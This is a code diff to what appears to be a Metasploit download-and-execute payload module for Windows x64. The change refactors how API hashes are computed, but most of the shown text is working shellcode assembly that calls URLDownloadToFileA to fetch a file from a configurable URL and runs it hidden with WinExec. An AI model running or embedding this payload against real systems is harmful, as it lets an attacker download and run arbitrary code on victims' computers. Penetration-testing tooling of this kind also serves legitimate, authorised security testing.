@@ -37,6 +37,7 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     url = datastore['URL'] || 'http://localhost/hi.exe'
     file = datastore['FILEPATH'] || 'fox.exe'
     display = datastore['DISPLAY'] || 'HIDE'
@@ -55,7 +56,7 @@ module MetasploitModule
         LoadLibrary:
             pop rcx ; rcx points to the dll name.
             xor byte [rcx+10], 'K' ; null terminator
-            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
             call rbp ; LoadLibraryA("urlmon.dll")
             ; To live alone one must be an animal or a god, says Aristotle. There is yet a third case: one must be both--a philosopher.
 
@@ -76,7 +77,7 @@ module MetasploitModule
             xor r9,r9   ; 4th argument
             sub rsp, 8
             push rcx    ; 5th argument
-            mov r10d, #{Rex::Text.block_api_hash('urlmon.dll', 'URLDownloadToFileA')}
+            mov r10d, #{block_api_hash('urlmon.dll', 'URLDownloadToFileA')}
             call rbp
 
         SetCommand:
@@ -86,7 +87,7 @@ module MetasploitModule
         Exec:
             pop rcx ; 1st argument
             xor byte [rcx+#{file.length + 7}], 'F' ; null terminator
-            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'WinExec')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'WinExec')}
             xor rdx, rdx ; 2nd argument
         ^
 
@@ -107,7 +108,7 @@ module MetasploitModule
     if datastore['EXITFUNC'] == 'process'
       exit_asm = %(
             xor rcx,rcx
-            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'ExitProcess')}
             call rbp
             )
       payload << exit_asm
@@ -115,7 +116,7 @@ module MetasploitModule
     elsif datastore['EXITFUNC'] == 'thread'
       exit_asm = %(
             xor rcx,rcx
-            mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitThread')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'ExitThread')}
             call rbp
             )
       payload << exit_asm
